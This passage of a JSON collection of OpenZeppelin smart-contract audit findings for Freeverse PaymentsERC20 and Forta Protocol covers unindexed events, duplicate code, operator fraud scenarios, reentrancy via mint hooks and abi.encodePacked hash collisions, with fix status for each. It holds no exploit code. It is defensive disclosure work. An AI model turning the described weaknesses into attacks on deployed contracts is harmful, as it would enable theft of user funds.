      "impact": "LOW",
      "content": "In theÂ `IPaymentsERC20`Â contract, theÂ [`Paid`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L52)Â event has an unindexedÂ `paymentId`Â parameter, even thoughÂ `paymentId`Â is indexed in theÂ [`BuyerRefunded`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L46)Â andÂ [`Payin`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L47)Â events.\n\n\nInÂ `FeesCollectors.sol`, theÂ [`DefaultFeesCollector`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol#L21)Â andÂ [`UniversalFeesCollector`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol#L22)Â events do not apply theÂ `indexed`Â keyword to theÂ `feesCollector`Â orÂ `universeId`Â parameters.\n\n\nInÂ `Operators.sol`, theÂ [`DefaultOperator`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol#L22)Â andÂ [`UniverseOperator`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol#L23)Â events do not apply theÂ `indexed`Â keyword to theÂ `operator`Â orÂ `universeId`Â parameters.\n\n\nIndexed parameters are useful for quick offchain indexing of logs. ConsiderÂ [indexing applicable event parameters](https://solidity.readthedocs.io/en/latest/contracts.html#events)Â to support the searching and filtering abilities of offchain services.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `745c035`Â of PR #4](https://github.com/freeverseio/PaymentsERC20Public/pull/4/commits/745c035d42ba1343793e7d0b2c0759cce38fb3c6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10573",
      "title": "Duplicate code",
      "impact": "LOW",
      "content": "Duplication of code is error prone because the repeated implementations can get out of sync as the codebase evolves, potentially leading to unexpected behavior. There two instances of code duplication in theÂ `PaymentsERC20`Â contract:\n\n\n* The majority of the code in theÂ `pay`Â andÂ `relayedPay`Â functions inÂ `PaymentsERC20`Â is duplicated. Once the initial checks are completed in each case, all of the remaining steps are identical.Â [Lines 102-123](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L102-L123)Â inÂ `relayedPay`Â are nearly identical toÂ [lines 141-162](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L141-L162)Â inÂ `pay`, with the only difference beingÂ [line 106](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L106)Â vsÂ [line 145](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L145), which are functionally equivalent in setting the operator. Consider creating a shared private function for this duplicate code.\n* TheÂ `maxFundsAvailable`Â function makes calls to theÂ [external ERC20 contract](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L53)Â in order to obtain the buyerâ€™s approved spend allowance for theÂ `PaymentERC20`Â contract and the buyerâ€™s token balance in their wallet. To obtain allowance and balance information from the external contract,Â `PaymentERC20`Â implementsÂ [`allowance`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L318)Â andÂ [`erc20BalanceOf`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L313)Â view functions that make respective calls to theÂ `allowance`Â andÂ `balanceOf`Â functions of theÂ `IERC20`Â interface. However, whenÂ `maxFundsAvailable`Â performs the allowance and balance queries, itÂ [calls the providedÂ `allowance`Â function](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L364), but not the providedÂ `balanceOf`Â function. In the latter case,Â `IERC20.balanceOf()`Â isÂ [called directly](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L365), duplicating the code in theÂ `erc20BalanceOf`Â function. Consider using theÂ `erc20BalanceOf`Â function to obtain the external token balanceÂ `erc20Balance`.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `645f3f4`Â of PR #1](https://github.com/freeverseio/PaymentsERC20Public/pull/1/commits/645f3f49e486c84f1dc96c9468ccdc72c485b402).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10572",
      "title": "Potential loss of access to funds if payment window is incorrectly set",
      "impact": "MEDIUM",
      "content": "TheÂ `_paymentWindow`Â variable within theÂ `PaymentsERC20`Â contract stores the maximum amount of time allowed for an asset transfer to be completed once a payment starts. The default value isÂ [30 days](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L55)Â and during this time, the buyerâ€™s funds remain locked. If the buyer tries to obtain a refund before the payment window has expired, theÂ [refund request will not be accepted](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L340).\n\n\nTheÂ `PaymentsERC20`Â contract has aÂ [`setPaymentWindow`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L65)Â function that allows the contract owner to adjust the payment window for future payments. This function does not impose a limit on the chosen window size, making it possible to set the value so high that obtaining a refund from an asset transfer that failed to complete would effectively be impossible.\n\n\nTo prevent potential loss of access to funds, within theÂ `setPaymentWindow`Â function, consider adding an upper limit on the payment window duration that the function will accept.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `a476fa1`Â of PR #3](https://github.com/freeverseio/PaymentsERC20Public/pull/3/commits/a476fa1f63495feccbcf8103a8e704abed301f26).*",
      "summary": "\nThis bug report is about the `PaymentsERC20` contract, which is part of the Freeverseio PaymentsERC20Public repository. The `_paymentWindow` variable within the contract stores the maximum amount of time allowed for an asset transfer to be completed once a payment starts. The default value is 30 days, and during this time, the buyerâ€™s funds remain locked. If the buyer tries to obtain a refund before the payment window has expired, the refund request will not be accepted.\n\nThe `PaymentsERC20` contract has a `setPaymentWindow` function that allows the contract owner to adjust the payment window for future payments. This function does not impose a limit on the chosen window size, making it possible to set the value so high that obtaining a refund from an asset transfer that failed to complete would effectively be impossible. To prevent potential loss of access to funds, the bug report suggested adding an upper limit on the payment window duration that the `setPaymentWindow` function will accept. The bug was fixed with commit `a476fa1` of PR #3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10571",
      "title": "Operators are implicitly trusted",
      "impact": "HIGH",
      "content": "In the current design of the payment system, the operator role wields a significant amount of power. A buyer cannot initiate a payment without the approval of an operator, and a seller must rely on an operator to vouch for the transfer of their asset. Operators are implicitly trusted to be good actors in the system. However, there are four possible scenarios where operators could behave maliciously:\n\n\n* *Operator as a buyer*: Both the buyer and operator need to agree upon theÂ `PaymentInput`Â data. But thereâ€™s nothing restricting an operator from also acting as a buyer, in which case they can approve their own transactions. More importantly, acting as a buyer an operator could defraud a seller by obtaining a refund even though the asset was received. After the sellerâ€™s asset is transferred, the operator could either create a signedÂ `AssetTransferResult`Â with theÂ `wasSuccessful`Â field set toÂ `false`, or not sign anÂ `AssetTransferResult`Â at all. The operator could then callÂ [`refund`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L183)Â orÂ [`refundAndWithdraw`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L188)Â after the payment window has expired, and obtain their full payment amount even though the sellerâ€™s item was successfully transferred.\n* *Operator as a seller*: The contracts do not restrict an operator from also being a seller in a transaction they are responsible for monitoring. In this case, an operator could register as a seller and post an item for sale. After a buyer initiates payment, the operator could craft anÂ `AssetTransferResult`Â with theÂ `wasSuccessful`Â field set toÂ `true`, but then choose not to transfer the asset. The operator could then callÂ [`finalize`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L166)Â orÂ [`finalizeAndWithdraw`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L174)Â with the signedÂ `AssetTransferResult`, prior to the payment window expiring, thus receiving payment for an asset that was never delivered.\n* *Operator colluding with a buyer*: Similar to the case where the operator and the buyer are the same, an operator could work together with a buyer in an attempt to obtain a refund for a transferred asset. As before, the operator could create a signedÂ `AssetTransferResult`Â withÂ `wasSuccessful`Â set toÂ `false`, even though the asset was transferred.\n* *Operator colluding with a seller*: Similar to the case where the operator and the seller are the same, an operator could work in conjunction with a seller who owns an item of value. As before, the operator would create a signedÂ `AssetTransferResult`Â withÂ `wasSuccessful`Â set toÂ `true`, even though the seller did not transfer the asset.\n\n\nAn operator should always be an observer of transactions and never participate as a buyer or seller. To prevent misuse of the power granted to an operator, consider adding checks which ensure that theÂ `buyer`Â andÂ `seller`Â addresses in theÂ [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L15)Â struct can never be the same as theÂ `operator`Â address for the same payment transaction. Also consider revisiting the trust assumptions that allow an operator entity to independently vouch for the success or failure of an asset transfer via theÂ `AssetTransferResult`Â mechanism, and how the system can guarantee that an asset transfer result is always produced.\n\n\n***Update:**Â Not an issue. After discussing with the Freeverse team, we have concluded that the system is designed with a trust assumption that the role of operator will always be in the favor of the system. Additionally, the team has applied the fixes in the codebase to ensure that an operator cannot be a buyer or a seller, this is fixed as ofÂ [commitÂ `714e99e`Â of PR #2](https://github.com/freeverseio/PaymentsERC20Public/pull/2/commits/714e99efb5e5bb17e7cc7b569ddcbbfdb422f517).*",
      "summary": "\nThe bug report focuses on the misuse of power by an operator in the current design of the payment system. An operator is implicitly trusted to be a good actor in the system, but there are four scenarios where they could behave maliciously. Firstly, an operator could act as a buyer and defraud a seller by obtaining a refund even though the asset was received. Secondly, an operator could act as a seller and receive payment for an asset that was never delivered. Thirdly, an operator could collude with a buyer to obtain a refund for a transferred asset. Lastly, an operator could collude with a seller who owns an item of value. \n\nTo prevent misuse of power by an operator, checks should be added which ensure that the buyer and seller addresses in the PaymentInput struct can never be the same as the operator address for the same payment transaction. Additionally, trust assumptions should be revisited that allow an operator entity to independently vouch for the success or failure of an asset transfer via the AssetTransferResult mechanism.\n\nAfter discussing with the Freeverse team, it was concluded that the system is designed with a trust assumption that the role of operator will always be in the favor of the system. Fixes were applied in the codebase to ensure that an operator cannot be a buyer or a seller, this is fixed as of commit 714e99e of PR #2.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10603",
      "title": "Reentrancy possibility due toÂ _doSafeTransferAcceptanceCheck",
      "impact": "LOW",
      "content": "After calling theÂ [`_mint`Â function in theÂ `FortaStaking`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213), the functionÂ [`_doSafeTransferAcceptanceCheck`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC1155/ERC1155Upgradeable.sol#L282)Â from theÂ `ERC1155Upgradeable`Â contract will get called, whichÂ [will hand over control to theÂ `to`Â address](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC1155/ERC1155Upgradeable.sol#L451).\n\n\nThis does not happen similarly for theÂ `_burn`Â function because theÂ `to`Â address would be theÂ `address(0)`. In theÂ `FortaStaking`Â contract, theÂ [`deposit`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L213)Â andÂ [`initiateWithdrawal`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L242)Â functions both make a call to theÂ `_mint`Â function followed by a call to theÂ `emitHook`Â function. TheÂ `emitHook`Â calls are currently undefined for these functions, but if they rely on calling into the Forta contracts to access certain variables, for example, then a malicious user may be able to affect these variables in unexpected ways.\n\n\nWhen developing Forta, specifically the â€œhookâ€ calls, developers should consider the fact that arbitrary code may be executed in the frame of theÂ `_mint`Â function call. Since more control exists for the hooks, consider moving the call to theÂ `_emitHook`Â function prior to theÂ `_mint`Â function call in these indicated cases. Additionally, consider forwarding relevant data in theÂ `_emitHook`Â function calls as it is needed (such as balances or ERC1155 tokens, or total supply) so that if they are tampered with in the context of theÂ `_mint`Â function call they will not affect theÂ `_emitHook`Â function call.\n\n\n***Update:**Â Fixed onÂ [commitÂ `0d91a544de1540459b71167dfdf318bb11acf6a6`Â in pull request 76](https://github.com/forta-protocol/forta-token/pull/76/commits/0d91a544de1540459b71167dfdf318bb11acf6a6). Some hooks have been removed until an implementation makes use of them.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10602",
      "title": "Deviation from specifications",
      "impact": "LOW",
      "content": "TheÂ [`StakingEscrow`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L18)Â implements the functionality to allow users who have vested tokens in L1 to be able to interact, participate, and stake those assets in the protocol. By doing so, the protocol could disburse rewards to users which would be collectable by calling theÂ [`release`Â function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/vesting/escrow/StakingEscrow.sol#L118), where theÂ [documentation states](https://app.diagrams.net/#G1TTjUyMn7rPYkztKp2NhEQczIkT4K3FK4)Â that even if these assets are sent to a non-whitelisted address, the tokens will arrive but those will get stuck.\n\n\nHowever, due to theÂ [`_beforeTokenTransfer`Â function hook](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L35)Â being called during any regular transfer of ERC20 tokens, itÂ [will not be possible](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L37)Â to send those assets to a non-whitelisted address.\n\n\nConsider either updating the documentation to reflect the current behavior of the protocol or fixing the implementation to follow the specifications.\n\n\n***Update:**Â Fixed. Now theÂ [documentation](https://drive.google.com/file/d/1TTjUyMn7rPYkztKp2NhEQczIkT4K3FK4/view)Â reflects what it is implemented in the code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10601",
      "title": "Semantic overload",
      "impact": "LOW",
      "content": "TheÂ [`ScannerRegistryEnable`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9)Â implements the functionality for enabling and disabling scanners, but it alsoÂ [extends the functionality of the registration process](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L36).\n\n\nWhen registering a new scanner, the contractÂ [checks if the minimum stake for the scanner type is greater than zero](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L37). This value is changed by the admin in theÂ [`FortaStaking`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L504)Â and it is meant to define a threshold value instead of an enabled status.\n\n\nThis is known asÂ [Semantic Overload](https://forum.openzeppelin.com/t/watch-out-for-semantic-overloading/1088). If the multiple meanings of the variables and states are not totally clear when making changes to the code, it can introduce severe vulnerabilities. We strongly discourage its usage if possible.\n\n\nConsider explicitly setting independent flags to represent the state of the scanners instead of using the same variable for different purposes.\n\n\n***Update:**Â Fixed onÂ [commitÂ `1869a5ab8461c106e283a2d23e857d8435a8587b`Â in pull request 78](https://github.com/forta-protocol/forta-token/pull/78/commits/1869a5ab8461c106e283a2d23e857d8435a8587b). Now, theÂ [scanner registration process checks](https://github.com/forta-protocol/forta-token/blob/27f795ef4748d460462f564427f17deebbada21a/contracts/components/scanners/ScannerRegistryCore.sol#L33)Â if a certain chain is activated by using an explicit flag.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10600",
      "title": "Non-registered scanners default to non-disabled states",
      "impact": "LOW",
      "content": "TheÂ [`ScannerRegistryEnable`Â contract](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L9)Â implements the functionality for enabling and disabling scanners, among other actions, and it uses bit maps to keep track of their states.\n\n\nHowever, whenÂ [enabling a scanner](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L65), theÂ [`_scannerEnable`Â internal function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L85)Â uses the inverse assignment, meaning that aÂ `1`Â flag accounts as a disabled state and aÂ `0`Â state as an enabled one. Although this will not be sufficient to mark a random scanner ID as enabled, as it must beÂ [registered as a ERC721](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L31)Â and haveÂ [enough stake on top of it](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/scanners/ScannerRegistryEnable.sol#L33), its default un-registered behavior resembles a non-disabled scanner.\n\n\nEven though this does not possess a security risk per se, in order to improve the readability of the code and reduce the attack surface, consider using a different state from the default one when enabling new scanners.\n\n\n***Update:**Â Acknowledged, will not fix. Forta teamâ€™s statement for this issue:*\n\n\n\n> It is true that the logic is inverted, and in a chain without min stake, an Agent/Scanner will be enabled (not disabled) on creation. This is acceptable to us because of several reasons: Registries are deployed in production, so we canâ€™t invert the logic ofÂ `_disableFlags`Â without downtime.Â `_disableFlag`Â at 1 does not just mean disabled, it is the permission of the wallet that disabled the scanner (`uint8`, or ratherÂ `Permission`Â enum) so having a value that means â€œscanner registered the first time but not enabled yetâ€ might complicate things further.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10599",
      "title": "Magic numbers are used",
      "impact": "LOW",
      "content": "Throughout the codebase, there are occurrences of literal values with unexplained meaning. For example, the operation to get theÂ [maximum slashable stake](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStaking.sol#L296)Â in theÂ `FortaStaking`Â contract uses explicit numbers during the calculation without documenting the reasons of such values.\n\n\nTo improve the codeâ€™s readability and facilitate refactoring, consider defining a constant for every magic number, giving it a clear and self-explanatory name. For complex values, consider adding an inline comment explaining how they were calculated or why they were chosen.\n\n\n***Update:**Â Fixed onÂ [commitÂ `802b183505f637d1f4ec97a64b2c8b3d58057096`Â in pull request 60](https://github.com/forta-protocol/forta-token/pull/60/commits/802b183505f637d1f4ec97a64b2c8b3d58057096).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10598",
      "title": "Disabled scanners and agents may appear to be linked",
      "impact": "LOW",
      "content": "WithinÂ `Dispatch.sol`, the mappingsÂ [`scannerToAgents`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L18)Â andÂ [`agentToScanners`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L19)Â should store correct linkages between agents and scanners.\n\n\nIf an agent or scanner is disabled, they areÂ [not allowed to beÂ `link`ed](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/dispatch/Dispatch.sol#L74-L75). Thus, it follows that if scanners or agents which areÂ `link`ed are then disabled, theÂ `link`Â should be removed. However, this is not enforced â€“ a scanner or agent may be disabled, but the values inÂ `scannerToAgents`Â andÂ `agentsToScanners`Â may not reflect this.\n\n\nConsider adding a programmatical way to removeÂ `link`s whenever an agent or scanner is disabled. Consider that, since a single agent or scanner may have multiple instances it is linked to, theÂ `unlink`ing process may involve callingÂ `unlink`Â multiple times. This may mean adding a limit to the number of links for a single instance. Alternatively, consider documenting this behavior clearly for any 3rd-party developers, and encouraging them to double-check that both the scanner and agent are enabled when querying linked pairs.\n\n\n***Update:**Â Acknowledge, but will not fix. The Forta teamâ€™s statement for the issue:*\n\n\n\n> *Product requirements not clear yet, addressed in the conversation thread but we will not take action yet (since assigner software is doing that labor now).*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10597",
      "title": "Incomplete interfaces",
      "impact": "LOW",
      "content": "TheÂ [`IRouter`Â interface](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/IRouter.sol#L4)Â should have an externally accessed function which is not being declared in the interface, theÂ [`version`Â getter function](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/router/Router.sol#L19).\n\n\nConsider declaring all externally accessed functions without access control so users and developers can make use of interfaces when using the protocol.\n\n\n***Update:**Â Fixed onÂ [commitÂ `a1f8eee474259c7b408932a7abc567116859c106`Â in pull request 74](https://github.com/forta-protocol/forta-token/pull/74/commits/a1f8eee474259c7b408932a7abc567116859c106). Versioned contracts now inherit from theÂ `IVersioned`Â interface which declares the getter.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10596",
      "title": "Implicit casting",
      "impact": "LOW",
      "content": "Throughout the codebase, an instance of implicit casting between types has been detected.\n\n\nIn theÂ [`FortaStakingUtils`Â library](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L4), in linesÂ [10](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L10)Â andÂ [18](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/staking/FortaStakingUtils.sol#L18), theÂ `subjectType`Â `uint8`Â parameter is being used in a bitwiseÂ `OR`Â operation against aÂ `uint256`Â result.\n\n\nWhenever a different type of variable is needed, consider either checking and casting the variable into the desired type or using OpenZeppelinâ€™sÂ [`SafeCast`Â library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.4.2/contracts/utils/math/SafeCast.sol)Â which provides overflow checking when casting from one type of number to another.\n\n\n***Update:**Â Fixed onÂ [commitÂ `2ff21729d1daeb06d830b8a239dcb8d9fd7b9dfd`Â in pull request 59](https://github.com/forta-protocol/forta-token/pull/59/commits/2ff21729d1daeb06d830b8a239dcb8d9fd7b9dfd).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10595",
      "title": "Implement a remove-whitelist functionality",
      "impact": "LOW",
      "content": "Currently, to prevent tokens from being transferred while within the vesting schedule, aÂ [`WHITELIST_ROLE`Â is defined and checked inÂ `FortaCommon._beforeTokenTransfer`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/token/FortaCommon.sol#L36-L37). The user or contract can only transfer tokens if â€œwhitelistedâ€. Eventually, the whitelist requirement is planned to be removed via a contract upgrade.\n\n\nSince contract upgrades are notoriously risky due to storage slot assignment issues, and since the removal of the whitelist functionality is planned for future development, consider implementing an access controlled â€œremove whitelistâ€ functionality in the existing contract which disables the whitelist. This will also give users greater confidence about the future state of the system and allow development which may depend on the future system design to proceed more smoothly.\n\n\n***Update:**Â Fixed onÂ [commitÂ `dd558f1017eee429e8d66d9d151de3adf1d02a6d`Â in pull request 58](https://github.com/forta-protocol/forta-token/pull/58/commits/dd558f1017eee429e8d66d9d151de3adf1d02a6d).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Forta Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/forta-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10594",
      "title": "Potential for hash collisions with frontrun protection",
      "impact": "LOW",
      "content": "WithinÂ `AgentRegistryCore.sol`, calls to theÂ [`frontrunProtected`Â modifier](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38)Â utilizeÂ `abi.encodePacked`Â to create a â€œuniqueâ€ hash of some commited data.\n\n\nHowever, by using two dynamic parameters next to each other (both inÂ [`createAgent`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L38)Â and inÂ [`updateAgent`](https://github.com/forta-protocol/forta-token/blob/92d7a7ddd6672a7530a4bfc532d0d697e7f12744/contracts/components/agents/AgentRegistryCore.sol#L54)), hashes can be easily forged simply by adjustingÂ `metadata`Â andÂ `chainIds`, such that an agent may be created or updated incorrectly.\n\n\nBy simply usingÂ `abi.encode`Â rather thanÂ `abi.encodePacked`, such collisions from dynamic parameters being adjacent can be avoided. Consider usingÂ `abi.encode`Â here instead.\n\n\n***Update:**Â Fixed onÂ [commitÂ `2a7391dff896384174ca49ff960d889120961a4e`Â in pull request 